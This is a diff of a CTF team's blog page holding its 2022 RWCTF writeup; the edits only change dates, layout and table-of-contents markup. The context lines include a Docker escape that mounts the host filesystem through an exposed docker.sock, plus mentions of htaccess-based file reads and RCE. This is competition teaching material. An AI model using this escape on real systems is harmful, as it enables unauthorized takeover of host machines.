@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 RWCTF体验赛 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:type" content="blog"><meta property="og:title" content="2022 RWCTF体验赛 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/24249.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><meta property="article:published_time" content="2022-01-30T08:50:17.000Z"><meta property="article:modified_time" content="2025-07-13T11:51:23.024Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="RWCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/24249.html"},"headline":"2022 RWCTF体验赛 SU Writeup","image":["https://team-su.github.io/images/2022-1-22-RWCTF/1.png"],"datePublished":"2022-01-30T08:50:17.000Z","dateModified":"2025-07-13T11:51:23.024Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"}</script><link rel="canonical" href="https://team-su.github.io/posts/24249.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link data-pjax rel="stylesheet" href="/css/default.css"><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2022 RWCTF体验赛 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:type" content="blog"><meta property="og:title" content="2022 RWCTF体验赛 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/24249.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><meta property="article:published_time" content="2022-01-30T08:50:17.000Z"><meta property="article:modified_time" content="2025-12-05T16:18:48.395Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="RWCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2022-1-22-RWCTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/24249.html"},"headline":"2022 RWCTF体验赛 SU Writeup","image":["https://team-su.github.io/images/2022-1-22-RWCTF/1.png"],"datePublished":"2022-01-30T08:50:17.000Z","dateModified":"2025-12-05T16:18:48.395Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析"}</script><link rel="canonical" href="https://team-su.github.io/posts/24249.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link data-pjax rel="stylesheet" href="/css/default.css"><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
   (function () {
       function switchTab() {
           if (!location.hash) {
@@ -29,54 +29,9 @@
       switchTab();
       window.addEventListener('hashchange', switchTab, false);
   })();
-  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-30T08:50:17.000Z" title="2022/1/30 16:50:17">2022-01-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:51:23.024Z" title="2025/7/13 19:51:23">2025-07-13</time></span><span class="level-item">31 minutes read (About 4704 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 RWCTF体验赛 SU Writeup</h1><div class="content"><p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#x72;&#115;&#x5f;&#120;&#99;&#116;&#x66;&#x40;&#x31;&#x32;&#x36;&#46;&#99;&#111;&#x6d;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析</p>
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-10-tablet is-10-desktop is-10-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-01-30T08:50:17.000Z" title="2022/1/30 16:50:17">2022-01-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-12-05T16:18:48.395Z" title="2025/12/6 00:18:48">2025-12-06</time></span><span class="level-item">31 minutes read (About 4589 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2022 RWCTF体验赛 SU Writeup</h1><div class="content"><p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#x65;&#114;&#115;&#95;&#120;&#x63;&#116;&#x66;&#64;&#49;&#x32;&#x36;&#46;&#99;&#x6f;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析</p>
 <span id="more"></span>
-<hr>
-<p>本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！<br><img src="../images/2022-1-22-RWCTF/1.png"><br>同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#101;&#114;&#115;&#95;&#x78;&#99;&#x74;&#x66;&#64;&#x31;&#50;&#x36;&#46;&#x63;&#111;&#109;">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2022 RWCTF体验赛 的 writeup 以及RWCTF RWDN 复现解析</p>
-<div class="toc">
-
-<!-- toc -->
-
-<ul>
-<li><a href="#pwn">pwn</a><ul>
-<li><a href="#remote-debug-server">Remote-debug-Server</a></li>
-<li><a href="#be-a-docker-escaper">Be-a-Docker-Escaper</a></li>
-<li><a href="#be-a-vm-escaper">Be-a-VM-Escaper</a></li>
-<li><a href="#phonograph">Phonograph</a></li>
-</ul>
-</li>
-<li><a href="#web">WEB</a></li>
-<li><a href="#realworld-ctf-2022-rwdn-fu-xian-jie-xi">Realworld CTF 2022 - RWDN 复现解析</a><ul>
-<li><a href="#qian-qing-ti-yao">前情提要</a></li>
-<li><a href="#na-dao-ti-mu">拿到题目</a><ul>
-<li><a href="#source-shen-ji">source 审计</a></li>
-<li><a href="#check-shen-ji">check 审计</a></li>
-<li><a href="#kan-yi-yan-31338-duan-kou">看一眼 31338 端口</a></li>
-</ul>
-</li>
-<li><a href="#si-lu-he-li-yong">思路和利用</a><ul>
-<li><a href="#di-yi-bu-fen">第一部分</a><ul>
-<li><a href="#errordocument">ErrorDocument</a></li>
-<li><a href="#shang-chuan-wen-jian">上传文件</a></li>
-</ul>
-</li>
-<li><a href="#di-er-bu-fen">第二部分</a><ul>
-<li><a href="#apache2-conf-shen-ji">apache2.conf审计</a></li>
-</ul>
-</li>
-<li><a href="#htaccess-lan-yong-gua-zai-ld-perload">htaccess 滥用 挂载 LD_PERLOAD</a></li>
-</ul>
-</li>
-<li><a href="#zui-hou-getshell-readflag">最后 Getshell readflag</a></li>
-<li><a href="#wrap-up">Wrap up</a></li>
-</ul>
-</li>
-</ul>
-<!-- tocstop -->
-
-</div>
-
-
+<p><img src="../images/2022-1-22-RWCTF/1.png"></p>
 <h1><span id="pwn">pwn</span><a href="#pwn" class="header-anchor"></a></h1><h3><span id="remote-debug-server">Remote-debug-Server</span><a href="#remote-debug-server" class="header-anchor"></a></h3><p>直接 remote get &#x2F;flag flag </p>
 <h3><span id="be-a-docker-escaper">Be-a-Docker-Escaper</span><a href="#be-a-docker-escaper" class="header-anchor"></a></h3><p>docker逃逸,参考 <a href="https://www.anquanke.com/post/id/179623#h2-3">这篇文章</a> 发现题目提供的dockerfile中有  <code>docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!</code>这一行 将docker.sock映射到docker中的&#x2F;s目录下,因此和文章中一样操作即可</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker.io</span><br><span class="line"><span class="built_in">mkdir</span> /aa</span><br><span class="line">docker -H unix:///s/docker.sock run -v /:/aa -i ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
@@ -168,48 +123,7 @@
 <li>利用 htaccess 越界读 获取 一些敏感配置文件</li>
 <li>利用 htaccess 和 一些错误配置 RCE</li>
 </ol>
-</div><div class="article-licensing box"><div class="licensing-title"><p>2022 RWCTF体验赛 SU Writeup</p><p><a href="https://team-su.github.io/posts/24249.html">https://team-su.github.io/posts/24249.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-01-30</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/RWCTF/">RWCTF</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/52932.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 SUSCTF SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/65490.html"><span class="level-item">2021 SCTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget widget-toc is-hidden-touch"><div class="card-content"><div class="menu"><p class="menu-label">目录</p><div class="menu-list">
-
-<!-- toc -->
-
-<ul>
-<li><a href="#pwn">pwn</a><ul>
-<li><a href="#remote-debug-server">Remote-debug-Server</a></li>
-<li><a href="#be-a-docker-escaper">Be-a-Docker-Escaper</a></li>
-<li><a href="#be-a-vm-escaper">Be-a-VM-Escaper</a></li>
-<li><a href="#phonograph">Phonograph</a></li>
-</ul>
-</li>
-<li><a href="#web">WEB</a></li>
-<li><a href="#realworld-ctf-2022-rwdn-fu-xian-jie-xi">Realworld CTF 2022 - RWDN 复现解析</a><ul>
-<li><a href="#qian-qing-ti-yao">前情提要</a></li>
-<li><a href="#na-dao-ti-mu">拿到题目</a><ul>
-<li><a href="#source-shen-ji">source 审计</a></li>
-<li><a href="#check-shen-ji">check 审计</a></li>
-<li><a href="#kan-yi-yan-31338-duan-kou">看一眼 31338 端口</a></li>
-</ul>
-</li>
-<li><a href="#si-lu-he-li-yong">思路和利用</a><ul>
-<li><a href="#di-yi-bu-fen">第一部分</a><ul>
-<li><a href="#errordocument">ErrorDocument</a></li>
-<li><a href="#shang-chuan-wen-jian">上传文件</a></li>
-</ul>
-</li>
-<li><a href="#di-er-bu-fen">第二部分</a><ul>
-<li><a href="#apache2-conf-shen-ji">apache2.conf审计</a></li>
-</ul>
-</li>
-<li><a href="#htaccess-lan-yong-gua-zai-ld-perload">htaccess 滥用 挂载 LD_PERLOAD</a></li>
-</ul>
-</li>
-<li><a href="#zui-hou-getshell-readflag">最后 Getshell readflag</a></li>
-<li><a href="#wrap-up">Wrap up</a></li>
-</ul>
-</li>
-</ul>
-<!-- tocstop -->
-
-</div><div class="toc-scroll-track"><div class="toc-scroll-thumb"></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.slim.min.js"></script><script>var IcarusThemeSettings = {
+</div><div class="article-licensing box"><div class="licensing-title"><p>2022 RWCTF体验赛 SU Writeup</p><p><a href="https://team-su.github.io/posts/24249.html">https://team-su.github.io/posts/24249.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-01-30</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-12-06</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/RWCTF/">RWCTF</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/52932.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 SUSCTF SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/65490.html"><span class="level-item">2021 SCTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav></div><!--!--><div class="column column-right is-2-tablet is-2-desktop is-2-widescreen  order-3 is-sticky"><div class="card widget widget-toc is-hidden-touch"><div class="card-content"><div class="menu"><p class="menu-label">目录</p><div class="menu-list"><ul class="toc-list"><li class="lvl-1"><a href="#pwn">pwn</a></li><li class="lvl-3"><a href="#remote-debug-server">Remote-debug-Server</a></li><li class="lvl-3"><a href="#be-a-docker-escaper">Be-a-Docker-Escaper</a></li><li class="lvl-3"><a href="#be-a-vm-escaper">Be-a-VM-Escaper</a></li><li class="lvl-3"><a href="#phonograph">Phonograph</a></li><li class="lvl-1"><a href="#web">WEB</a></li><li class="lvl-1"><a href="#realworld-ctf-2022-rwdn-fu-xian-jie-xi">Realworld CTF 2022 - RWDN 复现解析</a></li><li class="lvl-2"><a href="#qian-qing-ti-yao">前情提要</a></li><li class="lvl-2"><a href="#na-dao-ti-mu">拿到题目</a></li><li class="lvl-3"><a href="#source-shen-ji">source 审计</a></li><li class="lvl-3"><a href="#check-shen-ji">check 审计</a></li><li class="lvl-3"><a href="#kan-yi-yan-31338-duan-kou">看一眼 31338 端口</a></li><li class="lvl-2"><a href="#si-lu-he-li-yong">思路和利用</a></li><li class="lvl-3"><a href="#di-yi-bu-fen">第一部分</a></li><li class="lvl-3"><a href="#di-er-bu-fen">第二部分</a></li><li class="lvl-3"><a href="#htaccess-lan-yong-gua-zai-ld-perload">htaccess 滥用 挂载 LD_PERLOAD</a></li><li class="lvl-2"><a href="#zui-hou-getshell-readflag">最后 Getshell readflag</a></li><li class="lvl-2"><a href="#wrap-up">Wrap up</a></li></ul></div><div class="toc-scroll-track"><div class="toc-scroll-thumb"></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.slim.min.js"></script><script>var IcarusThemeSettings = {
             article: {
                 highlight: {
                     clipboard: false,
